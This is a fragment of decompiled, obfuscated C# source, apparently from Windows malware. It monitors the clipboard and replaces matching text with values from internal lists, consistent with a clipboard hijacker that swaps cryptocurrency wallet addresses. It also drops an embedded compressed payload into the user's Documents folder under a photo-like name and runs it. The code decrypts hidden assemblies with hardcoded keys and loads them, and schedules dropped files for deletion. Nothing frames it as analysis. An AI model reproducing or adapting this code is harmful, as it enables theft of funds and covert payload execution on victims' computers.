			if (!Class23.smethod_86(class36_0.class40_0, class36_0.class37_0))
			{
				return false;
			}
			class36_0.class39_0 = Class23.smethod_104(class36_0.class40_0);
			class36_0.class39_1 = Class23.smethod_16(class36_0.class40_0);
			class36_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class23.smethod_22(class36_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static byte[] smethod_75(byte[] byte_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		using MemoryStream stream = new MemoryStream(byte_0);
		using GZipStream gZipStream = new GZipStream(stream, CompressionMode.Decompress);
		byte[] array = new byte[1024];
		for (int num = gZipStream.Read(array, 0, array.Length); num != 0; num = gZipStream.Read(array, 0, array.Length))
		{
			memoryStream.Write(array, 0, num);
		}
		return memoryStream.ToArray();
	}

	static void smethod_76(Class13 class13_0, Class10 class10_0)
	{
		class13_0.class10_1 = class10_0;
	}

	static void smethod_77(Class34 class34_0)
	{
		class34_0.type_0.GetMethod("Clear")!.Invoke(class34_0.object_0, new object[0]);
	}

	static void smethod_78(Class35.Class38 class38_0, int int_0, int int_1)
	{
		if ((class38_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class38_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class38_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class38_0.byte_0, num, class38_0.byte_0, class38_0.int_0, int_0);
				class38_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class38_0.byte_0[class38_0.int_0++] = class38_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class23.smethod_106(class38_0, num, int_0, int_1);
		}
	}

	static void smethod_79(Class33 class33_0)
	{
		class33_0.type_0.GetMethod("Clear")!.Invoke(class33_0.object_0, new object[0]);
	}

	static bool smethod_80(ref byte[] byte_0, ref string string_0, string string_1)
	{
		try
		{
			Class10 class10_ = new Class10(10u);
			Class10 class10_2 = new Class10(Class19.string_4);
			Class14 @class = new Class14(class10_, class10_2, 0);
			@class.vmethod_0(string_1);
			byte_0 = Class23.smethod_75(@class.byte_0);
			Class15 class2 = new Class15();
			class2.class10_1 = new Class10((ushort)((int)Class19.ushort_1 / 16 + 1));
			class2.vmethod_0(string_1);
			string_0 = Class20.smethod_0(class2[Class19.ushort_1]);
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\DSC04232" + string_0;
			File.WriteAllBytes(text, byte_0);
			Process.Start(text);
		}
		catch
		{
			return false;
		}
		return true;
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string existingFileName, string newFileName, int flags);

	static void smethod_81(Class5 class5_0, ushort ushort_0)
	{
		class5_0.string_0 = $"{ushort_0:x4}{Class23.smethod_18(class5_0):x4}";
	}

	static void smethod_82(Class10 class10_0, Class10 class10_1, string string_0, ushort ushort_0)
	{
		Class23.smethod_29(ushort_0, class10_0, class10_1, string_0, (byte[])null);
	}

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	static extern bool EndUpdateResourceW(IntPtr intptr_0, bool bool_0);

	static byte[] smethod_83(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class23.smethod_36(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class35.Stream0 stream = new Class35.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class23.smethod_42(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class23.smethod_23(stream);
			int num3 = Class23.smethod_23(stream);
			int num4 = Class23.smethod_23(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class23.smethod_42(stream);
			Class23.smethod_42(stream);
			Class23.smethod_42(stream);
			int num5 = Class23.smethod_42(stream);
			int num6 = Class23.smethod_23(stream);
			int num7 = Class23.smethod_23(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class35.Class36 class36_ = new Class35.Class36(array2);
			array = new byte[num5];
			Class23.smethod_67(0, array, class36_, array.Length);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class23.smethod_42(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class23.smethod_42(stream);
					num11 = Class23.smethod_42(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class35.Class36 class36_2 = new Class35.Class36(array3);
					Class23.smethod_67(i, array, class36_2, num11);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 88, 91, 135, 218, 254, 91, 160, 173 };
				byte[] byte_2 = new byte[8] { 214, 194, 118, 68, 244, 3, 158, 205 };
				using Class34 class34_ = new Class34();
				using ICryptoTransform cryptoTransform = Class23.smethod_102(bool_0: true, class34_, byte_2, byte_);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class23.smethod_83(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class33 class33_ = new Class33();
				using ICryptoTransform cryptoTransform2 = Class23.smethod_15(byte_4, bool_0: true, byte_5, class33_);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class23.smethod_83(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static Assembly smethod_84(object sender, ResolveEventArgs e)
	{
		Class26.Struct3 @struct = new Class26.Struct3(e.Name);
		string s = @struct.method_0(includeVersion: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "e2IyOTlkODJmLTk4YzItNDUyZi04NmRhLWFmYWUwNTllNDFiYn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{d855033e-14f8-40c9-b7be-a59aa1e97bea},e2IyOTlkODJmLTk4YzItNDUyZi04NmRhLWFmYWUwNTllNDFiYn0=,[z]{d855033e-14f8-40c9-b7be-a59aa1e97bea}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			lock (Class26.hashtable_0)
			{
				if (Class26.hashtable_0.ContainsKey(text2))
				{
					return (Assembly)Class26.hashtable_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class23.smethod_83(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class23.MoveFileEx(text5, (string)null, 4);
								Class23.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class26.hashtable_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static string smethod_85()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
	}

	static bool smethod_86(Class35.Class40 class40_0, Class35.Class37 class37_0)
	{
		while (true)
		{
			switch (class40_0.int_2)
			{
			case 5:
			{
				int int_ = Class35.Class40.int_1[class40_0.int_7];
				int num = Class23.smethod_62(class37_0, int_);
				if (num >= 0)
				{
					Class23.smethod_19(class37_0, int_);
					num += Class35.Class40.int_0[class40_0.int_7];
					while (num-- > 0)
					{
						class40_0.byte_1[class40_0.int_8++] = class40_0.byte_2;
					}
					if (class40_0.int_8 == class40_0.int_6)
					{
						return true;
					}
					goto IL_009b;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class23.smethod_71(class40_0.class39_0, class37_0)) & -16) == 0)
				{
					class40_0.byte_1[class40_0.int_8++] = (class40_0.byte_2 = (byte)num2);
					if (class40_0.int_8 == class40_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class40_0.byte_2 = 0;
					}
					class40_0.int_7 = num2 - 16;
					class40_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class40_0.int_8 < class40_0.int_5)
				{
					int num3 = Class23.smethod_62(class37_0, 3);
					if (num3 >= 0)
					{
						Class23.smethod_19(class37_0, 3);
						class40_0.byte_0[Class35.Class40.int_9[class40_0.int_8]] = (byte)num3;
						class40_0.int_8++;
						continue;
					}
					return false;
				}
				class40_0.class39_0 = new Class35.Class39(class40_0.byte_0);
				class40_0.byte_0 = null;
				class40_0.int_8 = 0;
				class40_0.int_2 = 4;
				goto case 4;
			case 2:
				class40_0.int_5 = Class23.smethod_62(class37_0, 4);
				if (class40_0.int_5 >= 0)
				{
					class40_0.int_5 += 4;
					Class23.smethod_19(class37_0, 4);
					class40_0.byte_0 = new byte[19];
					class40_0.int_8 = 0;
					class40_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class40_0.int_4 = Class23.smethod_62(class37_0, 5);
				if (class40_0.int_4 >= 0)
				{
					class40_0.int_4++;
					Class23.smethod_19(class37_0, 5);
					class40_0.int_6 = class40_0.int_3 + class40_0.int_4;
					class40_0.byte_1 = new byte[class40_0.int_6];
					class40_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class40_0.int_3 = Class23.smethod_62(class37_0, 5);
				if (class40_0.int_3 >= 0)
				{
					class40_0.int_3 += 257;
					Class23.smethod_19(class37_0, 5);
					class40_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_009b:
			class40_0.int_2 = 4;
		}
	}

	static long smethod_87(BinaryWriter binaryWriter_0)
	{
		long num = binaryWriter_0.BaseStream.Position;
		if (num % 4L != 0L)
		{
			long num2 = 4L - num % 4L;
			Class23.smethod_3(binaryWriter_0, (ushort)num2);
			num += num2;
		}
		return num;
	}

	static bool smethod_88(Class8.Class9 class9_0, Process process_0)
	{
		return process_0.Id == class9_0.int_0;
	}

	static void smethod_89()
	{
		try
		{
			Class31.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_90(string string_0, Class7 class7_0)
	{
		if (File.Exists(string_0))
		{
			File.SetAttributes(string_0, FileAttributes.Normal);
		}
		try
		{
			File.Copy(class7_0.string_0, string_0, overwrite: true);
		}
		catch
		{
		}
	}

	static void smethod_91(Class10 class10_0, ushort ushort_0, Class13 class13_0, string string_0, Class10 class10_1)
	{
		byte[] byte_ = Class23.smethod_58(class13_0);
		Class23.smethod_29(ushort_0, class10_1, class10_0, string_0, byte_);
	}

	unsafe static void smethod_92(string string_0, string string_1)
	{
		Class17.Class18 @class = new Class17.Class18();
		@class.string_0 = string_1;
		Class8.int_1 = Convert.ToInt32(string_0);
		Thread thread = new Thread(new ThreadStart(@class, (nint)(delegate*<Class17.Class18, void>)(&Class23.smethod_1)));
		thread.Start();
	}

	static void smethod_93(Class35.Class38 class38_0, int int_0)
	{
		if (class38_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class38_0.byte_0[class38_0.int_0++] = (byte)int_0;
		class38_0.int_0 &= 32767;
	}

	static ushort smethod_94(Class15 class15_0)
	{
		IntPtr intptr_ = class15_0.class10_1.intptr_0;
		return (ushort)intptr_.ToInt32();
	}

	unsafe static bool smethod_95(int int_0)
	{
		Class8.Class9 @class = new Class8.Class9();
		@class.int_0 = int_0;
		return Process.GetProcesses().Any(new Func<Process, bool>(@class, (nint)(delegate*<Class8.Class9, Process, bool>)(&Class23.smethod_88)));
	}

	static void smethod_96(IntPtr intptr_0, ushort ushort_0, Class10 class10_0, Class10 class10_1, Class13 class13_0)
	{
		if (IntPtr.Zero == intptr_0)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		IntPtr intPtr = Class23.FindResourceExW(intptr_0, class10_1.intptr_0, class10_0.intptr_0, ushort_0);
		if (IntPtr.Zero == intPtr)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		IntPtr intPtr2 = Class23.LoadResource(intptr_0, intPtr);
		if (IntPtr.Zero == intPtr2)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		IntPtr intPtr3 = Class23.LockResource(intPtr2);
		if (intPtr3 == IntPtr.Zero)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		class13_0.int_0 = Class23.SizeofResource(intptr_0, intPtr);
		if (class13_0.int_0 <= 0)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		class13_0.class10_0 = class10_1;
		class13_0.class10_1 = class10_0;
		class13_0.ushort_0 = ushort_0;
		class13_0.vmethod_1(intptr_0, intPtr3);
	}

	static void smethod_97(Class22 class22_0, IntPtr intptr_0)
	{
		class22_0.struct2_0 = (Class21.Struct2)Marshal.PtrToStructure(intptr_0, typeof(Class21.Struct2));
	}

	static void smethod_98(BinaryWriter binaryWriter_0, long long_0, long long_1)
	{
		long position = binaryWriter_0.BaseStream.Position;
		binaryWriter_0.Seek((int)long_1, SeekOrigin.Begin);
		binaryWriter_0.Write((ushort)long_0);
		binaryWriter_0.Seek((int)position, SeekOrigin.Begin);
	}

	static string smethod_99()
	{
		Random random = new Random();
		int num = random.Next(0, 100);
		if (Class8.bool_0 & (num < Class8.int_2))
		{
			num = random.Next(0, Class8.string_3.GetUpperBound(0));
			return Class8.string_3[num];
		}
		num = random.Next(0, Class8.string_1.GetUpperBound(0));
		return Class8.string_1[num];
	}

	static ushort smethod_100(uint uint_0)
	{
		return (ushort)((uint_0 & 0xFFFF0000u) >> 16);
	}

	static void smethod_101(EventHandler<EventArgs0> eventHandler_0, Control0 control0_0)
	{
		EventHandler<EventArgs0> eventHandler = control0_0.eventHandler_0;
		EventHandler<EventArgs0> eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler<EventArgs0> value = (EventHandler<EventArgs0>)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref control0_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	static ICryptoTransform smethod_102(bool bool_0, Class34 class34_0, byte[] byte_0, byte[] byte_1)
	{
		class34_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class34_0.object_0, new object[1] { byte_1 });
		class34_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class34_0.object_0, new object[1] { byte_0 });
		MethodInfo method = class34_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class34_0.object_0, new object[0]);
	}

	static void smethod_103(Control0 control0_0)
	{
		try
		{
			((Control)control0_0).set_Enabled(false);
			IDataObject dataObject = Clipboard.GetDataObject();
			if (control0_0.eventHandler_0 != null)
			{
				control0_0.eventHandler_0(control0_0, new EventArgs0(dataObject));
				if (Clipboard.ContainsText())
				{
					switch (Class23.smethod_70(Clipboard.GetText()))
					{
					case 1:
						Clipboard.SetText(Class23.smethod_63());
						break;
					case 2:
						Clipboard.SetText(Class23.smethod_99());
						break;
					}
				}
			}
			((Control)control0_0).set_Enabled(true);
		}
		catch
		{
			((Control)control0_0).set_Enabled(true);
		}
	}

	static Class35.Class39 smethod_104(Class35.Class40 class40_0)
	{
		byte[] array = new byte[class40_0.int_3];
		Array.Copy(class40_0.byte_1, 0, array, 0, class40_0.int_3);
		return new Class35.Class39(array);
	}

	static void smethod_105(Form0 form0_0, object object_0, EventArgs0 eventArgs0_0)
	{
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern IntPtr LoadLibraryEx(string string_0, IntPtr intptr_0, uint uint_0);

	static void smethod_106(Class35.Class38 class38_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class38_0.byte_0[class38_0.int_0++] = class38_0.byte_0[int_0++];
			class38_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static Class21.Struct0 smethod_107(Class11 class11_0)
	{
		return class11_0.struct0_0;
	}

	static ushort smethod_108(int int_0, int int_1)
	{
		return (ushort)(((ushort)int_0 << 10) | (ushort)int_1);
	}

	static bool smethod_109(IntPtr intptr_0)
	{
		return (uint)(int)intptr_0 <= 65535u;
	}

	static ushort smethod_110(int int_0)
	{
		return (ushort)(int_0 / 16 + 1);
	}

	static void smethod_111(Class22 class22_0, string string_0)
	{
		uint num = 0u;
		uint num2 = 0u;
		uint num3 = 0u;
		uint num4 = 0u;
		string[] array = string_0.Split(".".ToCharArray(), 4);
		if (array.Length >= 1)
		{
			num = uint.Parse(array[0]);
		}
		if (array.Length >= 2)
		{
			num2 = uint.Parse(array[1]);
		}
		if (array.Length >= 3)
		{
			num3 = uint.Parse(array[2]);
		}
		if (array.Length >= 4)
		{
			num4 = uint.Parse(array[3]);
		}
		class22_0.struct2_0.uint_2 = (num << 16) + num2;
		class22_0.struct2_0.uint_3 = (num3 << 16) + num4;
	}

	static void smethod_112(Class35.Class37 class37_0)
	{
		class37_0.uint_0 >>= class37_0.int_2 & 7;
		class37_0.int_2 &= -8;
	}

	[DllImport("User32.dll")]
	static extern int SetClipboardViewer(int int_0);

	static int smethod_113(Class35.Class38 class38_0)
	{
		return 32768 - class38_0.int_1;
	}
}
